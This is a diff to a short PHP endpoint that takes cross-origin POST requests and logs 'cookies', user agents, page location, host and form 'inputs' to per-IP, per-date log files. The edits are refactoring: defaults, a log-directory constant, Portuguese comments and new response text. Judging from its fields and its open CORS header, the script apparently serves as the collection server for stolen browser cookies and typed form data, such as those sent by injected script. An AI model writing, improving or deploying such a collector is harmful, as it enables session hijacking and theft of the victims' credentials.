@@ -2,18 +2,19 @@
 
 header("Access-Control-Allow-Origin: *");
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    define("LOGS_DIR", __DIR__ . "/logs/");
 
     $curDate = date("d-m-Y");
     $curTime = date("H:i:s");
-    
+
     $remoteIP = $_SERVER["REMOTE_ADDR"];
-    $location = $_POST["location"];
-    $uagents = $_POST["uagents"];
-    $cookies = $_POST["cookies"];
-    $name = $_POST["name"];
-    $host = $_POST["host"];
-	$inputs = $_POST["inputs"];
+    $location = $_POST["location"] ?? "";
+    $uagents = $_POST["uagents"] ?? "";
+    $cookies = $_POST["cookies"] ?? "";
+    $name = $_POST["name"] ?? "";
+    $host = $_POST["host"] ?? "";
+    $inputs = $_POST["inputs"] ?? "";
 
     $data = [
         "remote_ip" => $remoteIP,
@@ -24,23 +25,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         "host" => $host,
         "date" => $curDate,
         "time" => $curTime,
-		"inputs" => $inputs,
+        "inputs" => $inputs,
     ];
 
-    $directory = "logs/" . $remoteIP . "/" . $curDate;
+    $directory = LOGS_DIR . $remoteIP . "/" . $curDate;
     $logfile = $directory . "/" . $curTime . ".log";
 
-    // Create directories if they don't exist
+    // Crie diretórios se eles não existirem
     if (!is_dir($directory)) {
         mkdir($directory, 0777, true);
     }
 
-    // Write data to log file
+    // Escreva dados no arquivo de log
     file_put_contents($logfile, json_encode($data, JSON_PRETTY_PRINT));
-    
-    echo "Data saved!";
-} else {
-    echo "Wrong request method.";
-}
 
+    echo "200 OK";
+} else {
+    echo "500 Internal Server Error";
+}
 ?>
